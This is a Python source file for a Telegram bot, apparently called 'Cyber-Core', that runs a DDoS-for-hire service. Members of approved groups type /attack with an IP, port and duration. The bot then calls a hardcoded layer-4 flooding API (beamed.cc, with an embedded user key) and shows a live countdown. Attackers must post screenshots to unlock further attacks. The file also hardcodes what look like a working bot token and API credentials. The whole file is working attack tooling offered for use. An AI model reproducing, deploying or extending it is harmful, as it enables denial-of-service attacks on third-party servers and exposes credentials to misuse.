import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import threading
import os
import re
from datetime import datetime, timedelta
import time
import requests
import json

# --- CONFIGURATION ---
BOT_TOKEN = "7951857029:AAGkVwayuNFbIK7b3SS6Ev0gZWdN0-bJb0E"
BOT_OWNER = 5851079012
REQUIRED_CHANNEL_1 = -1002004427126  # Original Channel
REQUIRED_CHANNEL_2 = -1002147999578 # Add your 2nd Channel ID here
DATA_FILE = "grp_data.json"

bot = telebot.TeleBot(BOT_TOKEN)

API_LIST = [
    "https://beamed.cc/layer4/?user=4988&key=p9XuDwnTQb2gdNRS&host={ip}&port={port}&time={time}&method=PUBG&concs=1"
]

DEFAULT_MAX_ATTACK_TIME = 120
DEFAULT_COOLDOWN = 120
PORT_BLOCK_DURATION = 7200

# --- DATA MANAGEMENT ---
def load_data():
    try:
        with open(DATA_FILE, 'r') as f:
            return json.load(f)
    except:
        return {
            "approved_groups": [],
            "banned_users": [],
            "feedbacks": [],
            "max_attack_time": DEFAULT_MAX_ATTACK_TIME,
            "cooldown": DEFAULT_COOLDOWN,
            "blocked_ports": {},
            "port_protection": False
        }

def save_data():
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=2, default=str)

data = load_data()

# --- GLOBALS & LOCKS ---
active_attacks = {}
user_cooldowns = {}
pending_feedback = {}
api_in_use = {}
user_attack_history = {}
_attack_lock = threading.Lock()

# --- HELPER FUNCTIONS ---
def is_owner(user_id):
    return user_id == BOT_OWNER

def is_approved_group(chat_id):
    return chat_id in data.get("approved_groups", [])

def is_banned(user_id):
    return user_id in data.get("banned_users", [])

def is_group(message):
    return message.chat.type in ['group', 'supergroup']

def is_channel_member(user_id):
    try:
        # Check Channel 1
        member1 = bot.get_chat_member(REQUIRED_CHANNEL_1, user_id)
        is_in_1 = member1.status in ['member', 'administrator', 'creator']
        
        # Check Channel 2
        member2 = bot.get_chat_member(REQUIRED_CHANNEL_2, user_id)
        is_in_2 = member2.status in ['member', 'administrator', 'creator']
        
        return is_in_1 and is_in_2  # Must be in BOTH
    except Exception as e:
        print(f"Membership check error: {e}")
        return False

def check_access(message):
    user_id = message.from_user.id
    if is_owner(user_id) and not is_group(message):
        return True
    if not is_group(message):
        bot.reply_to(message, "🚫 **ACCESS DENIED**\n\n`Unauthorized for personal use.`")
        return False
        
    # Checking both channels
    if not is_channel_member(user_id):
        bot.reply_to(message, 
            "⚠️ **UPLINK REQUIRED**\n\n"
            "You must join **BOTH** headquarters channels to gain access:\n\n"
            "1️⃣ [Join Channel 1](https://t.me/+Bh56Y28y4k5kZDM1)\n"
            "2️⃣ [Join Channel 2](https://t.me/+G9DpAkyGtTZiODI9)\n\n"
            "👉 *Once joined, try the command again.*", 
            parse_mode="Markdown", 
            disable_web_page_preview=True
        )
        return False
        
    if not is_approved_group(message.chat.id):
        bot.reply_to(message, "❌ **NODE NOT WHITELISTED**")
        return False
    if is_banned(user_id):
        bot.reply_to(message, "🚫 **IDENTITY NULLIFIED**")
        return False
    return True

def validate_target(target):
    ip_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    if ip_pattern.match(target):
        parts = target.split('.')
        for part in parts:
            if int(part) > 255: return False
        return True
    return False

def get_user_cooldown(user_id):
    with _attack_lock:
        if user_id not in user_cooldowns:
            return 0
        cooldown_end = user_cooldowns[user_id]
        remaining = (cooldown_end - datetime.now()).total_seconds()
        if remaining <= 0:
            del user_cooldowns[user_id]
            return 0
        return int(remaining)

def user_has_active_attack(user_id):
    with _attack_lock:
        now = datetime.now()
        for attack_id, attack in list(active_attacks.items()):
            if attack['end_time'] <= now: continue
            if attack.get('user_id') == user_id: return True
        return False

def get_active_attack_count():
    with _attack_lock:
        now = datetime.now()
        expired = [k for k, v in active_attacks.items() if v['end_time'] <= now]
        for k in expired:
            if k in active_attacks: del active_attacks[k]
            if k in api_in_use: del api_in_use[k]
        return len(active_attacks)

def get_free_api_index():
    with _attack_lock:
        now = datetime.now()
        expired = [k for k, v in active_attacks.items() if v['end_time'] <= now]
        for k in expired:
            if k in active_attacks: del active_attacks[k]
            if k in api_in_use: del api_in_use[k]
        busy_indices = set(api_in_use.values())
        for i in range(len(API_LIST)):
            if i not in busy_indices: return i
        return None

def has_pending_feedback(user_id):
    return user_id in pending_feedback

def is_port_blocked(target, port):
    key = f"{target}:{port}"
    blocked = data.get("blocked_ports", {})
    if key in blocked:
        block_time = datetime.strptime(blocked[key], '%d-%m-%Y %H:%M:%S')
        if (datetime.now() - block_time).total_seconds() < PORT_BLOCK_DURATION:
            remaining = PORT_BLOCK_DURATION - (datetime.now() - block_time).total_seconds()
            return True, int(remaining)
        else:
            del blocked[key]
            save_data()
    return False, 0

def check_port_protection(user_id, target, port):
    if not data.get("port_protection", False):
        return False, 0
    key = f"{target}:{port}"
    if user_id in user_attack_history and key in user_attack_history[user_id]:
        last_attack = user_attack_history[user_id][key]
        elapsed = (datetime.now() - last_attack).total_seconds()
        if elapsed < PORT_BLOCK_DURATION:
            remaining = PORT_BLOCK_DURATION - elapsed
            return True, int(remaining)
    return False, 0

# --- CORE LOGIC ---
def start_attack(target, port, duration, message, attack_id, api_index):
    try:
        user_id = message.from_user.id
        
        # 1. Send the initial "Attack Started" message
        sent_msg = bot.reply_to(message, f"🚀 **ATTACK INITIATED** 🚀\n\n"
                                         f"📡 **Target:** `{target}`\n"
                                         f"🔌 **Port:** `{port}`\n"
                                         f"⏳ **Time Left:** `{duration}s`\n"
                                         f"📟 **Slot:** `{api_index + 1}/{len(API_LIST)}`\n"
                                         f"━━━━━━━━━━━━━━━━━━\n"
                                         f"⚡ *Packet injection in progress...*")

        # 2. Trigger the API
        api_url = API_LIST[api_index].format(ip=target, port=port, time=duration)
        try:
            requests.get(api_url, timeout=10)
        except Exception as e:
            print(f"API Trigger Error: {e}")

        # 3. LIVE COUNTDOWN LOOP
        remaining = duration
        while remaining > 0:
            time.sleep(5)  # Update every 5 seconds to avoid Telegram rate limits
            remaining -= 5
            if remaining < 0: remaining = 0
            
            try:
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=sent_msg.message_id,
                    text=f"🚀 **ATTACK IN PROGRESS** 🚀\n\n"
                         f"📡 **Target:** `{target}`\n"
                         f"🔌 **Port:** `{port}`\n"
                         f"⏳ **Time Left:** `{remaining}s`\n"
                         f"📟 **Slot:** `{api_index + 1}/{len(API_LIST)}`\n"
                         f"━━━━━━━━━━━━━━━━━━\n"
                         f"⚡ *Injecting malicious payload...*"
                )
            except Exception as e:
                # If editing fails (e.g., message deleted), break the loop
                break

        # 4. Cleanup and Feedback Request
        with _attack_lock:
            if attack_id in active_attacks: del active_attacks[attack_id]
            if attack_id in api_in_use: del api_in_use[attack_id]

        pending_feedback[user_id] = {
            'target': target, 'port': port, 'duration': duration,
            'time': datetime.now().strftime('%d-%m-%Y %H:%M:%S'),
            'chat_id': message.chat.id
        }

        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=sent_msg.message_id,
            text=f"✅ **MISSION ACCOMPLISHED** ✅\n\n"
                 f"🎯 **Target:** `{target}:{port}`\n"
                 f"🏁 **Status:** Packets Delivered\n"
                 f"━━━━━━━━━━━━━━━━━━\n"
                 f"📸 **FEEDBACK REQUIRED:** Send screenshot to unlock next sequence."
        )

    except Exception as e:
        print(f"Attack thread error: {e}")

# --- COMMAND HANDLERS ---
@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.from_user.id
    if not is_group(message) and not is_owner(user_id):
        bot.reply_to(message, "🚫 **ACCESS DENIED**\n\n`Node not authorized.` Join a group node to use this bot.")
        return
    if is_owner(user_id) and not is_group(message):
        bot.reply_to(message, "👑 **ROOT ACCESS DETECTED**\n\nUse `/owner` for the main frame.")
        return
    if not is_group(message): return
    if not is_approved_group(message.chat.id):
        bot.reply_to(message, "❌ **NODE NOT WHITELISTED**")
        return
    bot.reply_to(message, "⚡ **SYSTEM ONLINE: CYBER-CORE V3** ⚡\n\n"
                          "🌐 **Uplink Established**\n"
                          "━━━━━━━━━━━━━━━━━━\n"
                          "⚔️ `/attack` <ip> <port> <time>\n"
                          "📊 `/status` - Network Load\n"
                          "🛡️ `/help` - Manual\n"
                          "━━━━━━━━━━━━━━━━━━")

@bot.message_handler(commands=['owner'])
def owner_panel(message):
    if not is_owner(message.from_user.id): return
    port_prot = "ENABLED ✅" if data.get("port_protection", False) else "DISABLED ❌"
    text = f"""👑 **ADMIN MAIN FRAME** 👑

📊 **Network Diagnostics:**
• 📂 Nodes: `{len(data.get('approved_groups', []))}`
• 🚫 Blacklisted: `{len(data.get('banned_users', []))}`
• 🕒 Max Burst: `{data.get('max_attack_time', DEFAULT_MAX_ATTACK_TIME)}s`
• ❄️ Cooldown: `{data.get('cooldown', DEFAULT_COOLDOWN)}s`
• 🛡️ Port Shield: `{port_prot}`
• 📡 API Slots: `{len(API_LIST)}`

🛠 **System Controls:**
🔹 `/approve` | `/disapprove` - Group Access
🔹 `/ban` | `/unban` <uid> - Identity Nullify
🔹 `/settime` | `/setcooldown` - Config
🔹 `/port_protection` on/off - Shield Toggle
🔹 `/feedbacks` - Data Logs"""
    bot.reply_to(message, text)

@bot.message_handler(commands=['approve'])
def approve_group(message):
    if not is_owner(message.from_user.id): return
    if is_group(message):
        chat_id = message.chat.id
        if chat_id not in data.get("approved_groups", []):
            if "approved_groups" not in data: data["approved_groups"] = []
            data["approved_groups"].append(chat_id)
            save_data()
            bot.reply_to(message, f"✅ **NODE ADDED:** `{chat_id}`")
        else:
            bot.reply_to(message, "⚠️ Node already in database.")
    else:
        bot.reply_to(message, "⚠️ Direct Command Error: Use inside group.")

@bot.message_handler(commands=['disapprove'])
def disapprove_group(message):
    if not is_owner(message.from_user.id): return
    if is_group(message):
        chat_id = message.chat.id
        if chat_id in data.get("approved_groups", []):
            data["approved_groups"].remove(chat_id)
            save_data()
            bot.reply_to(message, f"❌ **NODE REMOVED:** `{chat_id}`")
    else:
        parts = message.text.split()
        if len(parts) == 2:
            try:
                gid = int(parts[1])
                if gid in data.get("approved_groups", []):
                    data["approved_groups"].remove(gid)
                    save_data()
                    bot.reply_to(message, f"❌ **NODE REMOVED:** `{gid}`")
            except: bot.reply_to(message, "Invalid ID.")

@bot.message_handler(commands=['approved_groups'])
def show_approved_groups(message):
    if not is_owner(message.from_user.id): return
    groups = data.get("approved_groups", [])
    if not groups:
        bot.reply_to(message, "📋 No authorized nodes.")
        return
    text = "📂 **AUTHORIZED NODES:**\n\n"
    for i, gid in enumerate(groups, 1):
        text += f"{i}. `{gid}`\n"
    bot.reply_to(message, text)

@bot.message_handler(commands=['ban'])
def ban_user(message):
    if not is_owner(message.from_user.id): return
    parts = message.text.split()
    if len(parts) != 2: return
    try:
        uid = int(parts[1])
        if uid == BOT_OWNER: return
        if "banned_users" not in data: data["banned_users"] = []
        if uid not in data["banned_users"]:
            data["banned_users"].append(uid)
            save_data()
            bot.reply_to(message, f"🚫 **USER NULLIFIED:** `{uid}`")
    except: pass

@bot.message_handler(commands=['unban'])
def unban_user(message):
    if not is_owner(message.from_user.id): return
    parts = message.text.split()
    if len(parts) != 2: return
    try:
        uid = int(parts[1])
        if uid in data.get("banned_users", []):
            data["banned_users"].remove(uid)
            save_data()
            bot.reply_to(message, f"✅ **USER RESTORED:** `{uid}`")
    except: pass

@bot.message_handler(commands=['banned_list'])
def banned_list(message):
    if not is_owner(message.from_user.id): return
    banned = data.get("banned_users", [])
    text = "🚫 **BLACKLISTED IDENTITIES:**\n\n" + "\n".join([f"- `{u}`" for u in banned])
    bot.reply_to(message, text if banned else "📋 Blacklist empty.")

@bot.message_handler(commands=['settime'])
def set_max_time(message):
    if not is_owner(message.from_user.id): return
    parts = message.text.split()
    if len(parts) == 2:
        try:
            t = int(parts[1])
            data["max_attack_time"] = t
            save_data()
            bot.reply_to(message, f"⚙️ **MAX BURST SET:** `{t}s`")
        except: pass

@bot.message_handler(commands=['setcooldown'])
def set_cooldown(message):
    if not is_owner(message.from_user.id): return
    parts = message.text.split()
    if len(parts) == 2:
        try:
            c = int(parts[1])
            data["cooldown"] = c
            save_data()
            bot.reply_to(message, f"⚙️ **COOLDOWN SET:** `{c}s`")
        except: pass

@bot.message_handler(commands=['port_protection'])
def toggle_port_protection(message):
    if not is_owner(message.from_user.id): return
    parts = message.text.split()
    if len(parts) == 2:
        state = parts[1].lower() == 'on'
        data["port_protection"] = state
        save_data()
        bot.reply_to(message, f"🛡️ **PORT SHIELD:** {'ACTIVE' if state else 'OFF'}")

@bot.message_handler(commands=['block_port'])
def block_port(message):
    if not is_owner(message.from_user.id): return
    parts = message.text.split()
    if len(parts) == 3:
        key = f"{parts[1]}:{parts[2]}"
        if "blocked_ports" not in data: data["blocked_ports"] = {}
        data["blocked_ports"][key] = datetime.now().strftime('%d-%m-%Y %H:%M:%S')
        save_data()
        bot.reply_to(message, f"🚫 **TARGET QUARANTINED:** `{key}`")

@bot.message_handler(commands=['unblock_port'])
def unblock_port(message):
    if not is_owner(message.from_user.id): return
    parts = message.text.split()
    if len(parts) == 3:
        key = f"{parts[1]}:{parts[2]}"
        if key in data.get("blocked_ports", {}):
            del data["blocked_ports"][key]
            save_data()
            bot.reply_to(message, f"✅ **TARGET RELEASED:** `{key}`")

@bot.message_handler(commands=['blocked_ports'])
def list_blocked_ports(message):
    if not is_owner(message.from_user.id): return
    blocked = data.get("blocked_ports", {})
    if not blocked:
        bot.reply_to(message, "📋 No quarantined ports.")
        return
    text = "🚫 **QUARANTINED TARGETS:**\n\n"
    for k, v in blocked.items(): text += f"- `{k}`\n"
    bot.reply_to(message, text)

@bot.message_handler(commands=['feedbacks'])
def view_feedbacks(message):
    if not is_owner(message.from_user.id): return
    feedbacks = data.get("feedbacks", [])
    if not feedbacks:
        bot.reply_to(message, "📋 No logs found.")
        return
    text = "📑 **TRANSACTION LOGS (Last 20):**\n\n"
    for fb in feedbacks[-20:]:
        text += f"👤 `@{fb['username']}` | 🎯 `{fb['target']}` | 🕒 `{fb['time']}`\n"
    bot.reply_to(message, text)

@bot.message_handler(commands=['clear_feedbacks'])
def clear_feedbacks(message):
    if not is_owner(message.from_user.id): return
    data["feedbacks"] = []
    save_data()
    bot.reply_to(message, "🧹 **LOGS PURGED**")

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    if not check_access(message): return
    user_id = message.from_user.id
    
    if not is_owner(user_id) and has_pending_feedback(user_id):
        bot.reply_to(message, "⚠️ **LOGS NOT CLEARED**\n\n`Pending Feedback Detected.` Upload the previous session screenshot to proceed.")
        return
        
    if not is_owner(user_id):
        cooldown = get_user_cooldown(user_id)
        if cooldown > 0:
            bot.reply_to(message, f"⏳ **SYSTEM OVERHEAT**\n\nCooldown active. Please wait `{cooldown}s` for hardware reset.")
            return
            
    if user_has_active_attack(user_id):
        bot.reply_to(message, "❌ **DUPLICATE THREAD DETECTED**\n\nWait for current session to expire.")
        return
        
    active_count = get_active_attack_count()
    if active_count >= len(API_LIST):
        bot.reply_to(message, "❌ **LOAD LIMIT REACHED**\n\nAll uplink slots are busy. Monitor `/status` for a free slot.")
        return
        
    command_parts = message.text.split()
    if len(command_parts) != 4:
        bot.reply_to(message, "⚠️ **SYNTAX ERROR**\n\n`Use: /attack <ip> <port> <time>`")
        return
        
    target, port, duration = command_parts[1], command_parts[2], command_parts[3]
    
    if not validate_target(target):
        bot.reply_to(message, "❌ **INVALID IP ADDRESS**")
        return
        
    try:
        port, duration = int(port), int(duration)
        if port < 1 or port > 65535: return
        
        blocked, remaining = is_port_blocked(target, port)
        if blocked:
            bot.reply_to(message, f"🚫 **TARGET PROTECTED**\n\n`{target}:{port}` is currently quarantined for `{remaining // 60}m`.")
            return

        # --- TIME LIMIT LOGIC FOR NON-OWNERS ---
        if not is_owner(user_id):
            # 1. Minimum Check
            if duration < 60:
                bot.reply_to(message, "❌ **UNDERLOAD ERROR**\n\nMinimum burst time is `60s`.")
                return
            
            # 2. Maximum Check
            max_t = data.get('max_attack_time', DEFAULT_MAX_ATTACK_TIME)
            if duration > max_t:
                bot.reply_to(message, f"❌ **BURST LIMIT EXCEEDED:** Max is `{max_t}s`")
                return

            # 3. Port Protection Check
            protected, p_rem = check_port_protection(user_id, target, port)
            if protected:
                bot.reply_to(message, f"🛡️ **PORT SHIELD ACTIVE**\n\nCooldown for this target: `{p_rem // 60}m` remaining.")
                return
        # ---------------------------------------

        attack_id = f"{user_id}_{datetime.now().timestamp()}"
        api_index = get_free_api_index()
        if api_index is None: return
        
        with _attack_lock:
            cd_time = data.get('cooldown', DEFAULT_COOLDOWN)
            user_cooldowns[user_id] = datetime.now() + timedelta(seconds=(duration + cd_time))
            api_in_use[attack_id] = api_index
            active_attacks[attack_id] = {
                'target': target, 'port': port, 'duration': duration,
                'user_id': user_id, 'start_time': datetime.now(),
                'end_time': datetime.now() + timedelta(seconds=duration)
            }
        threading.Thread(target=start_attack, args=(target, port, duration, message, attack_id, api_index)).start()
        
    except ValueError:
        bot.reply_to(message, "❌ **DATATYPE ERROR:** Use numeric values for port and time.")

@bot.message_handler(commands=['status'])
def status_command(message):
    if not check_access(message): return
    active_count = get_active_attack_count()
    if active_count == 0:
        bot.reply_to(message, "📊 **NETWORK IDLE:** No active sessions.")
        return
    text = f"📊 **ACTIVE UPLINKS:** `{active_count}`\n\n"
    with _attack_lock:
        now = datetime.now()
        for aid, atk in active_attacks.items():
            if atk['end_time'] > now:
                rem = int((atk['end_time'] - now).total_seconds())
                text += f"📡 `{atk['target']}:{atk['port']}` | `{rem}s left`\n"
    bot.reply_to(message, text)

@bot.message_handler(commands=['help'])
def help_command(message):
    if not is_group(message) and is_owner(message.from_user.id):
        owner_panel(message)
        return
    if not check_access(message): return
    bot.reply_to(message, "🛡️ **PROTOCOL MANUAL**\n\n"
                          "⚔️ `/attack <ip> <port> <time>` - Start Attack\n"
                          "📊 `/status` - View Active Threads\n"
                          "❓ `/help` - Command Manual\n\n"
                          "📸 **NOTE:** Post-attack screenshots are required to unlock your next session.")

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    if not is_group(message): return
    if not is_approved_group(message.chat.id): return
    user_id = message.from_user.id
    if is_banned(user_id) or not has_pending_feedback(user_id): return
    username = message.from_user.username or str(user_id)
    fb_info = pending_feedback[user_id]
    if "feedbacks" not in data: data["feedbacks"] = []
    data["feedbacks"].append({
        "user_id": user_id, "username": username,
        "target": f"{fb_info['target']}:{fb_info['port']}",
        "duration": fb_info['duration'], "screenshot": True,
        "time": datetime.now().strftime('%d-%m-%Y %H:%M:%S'),
        "group": message.chat.title or str(message.chat.id)
    })
    save_data()
    del pending_feedback[user_id]
    bot.reply_to(message, f"✅ **DATA LOGGED**\n\n👤 `@ {username}`\n🎯 `{fb_info['target']}`\n⏱️ `{fb_info['duration']}s`\n\n`Sequence unlocked. You are clear for the next uplink.`")

@bot.message_handler(func=lambda m: True)
def handle_other(message):
    if not is_group(message) and not is_owner(message.from_user.id):
        bot.reply_to(message, "🚫 **ACCESS DENIED**")

print("Cyber-Core Group Bot starting...")
while True:
    try:
        bot.polling(none_stop=True, timeout=60, long_polling_timeout=60)
    except Exception as e:
        print(f"Polling error: {e}")
        time.sleep(5)
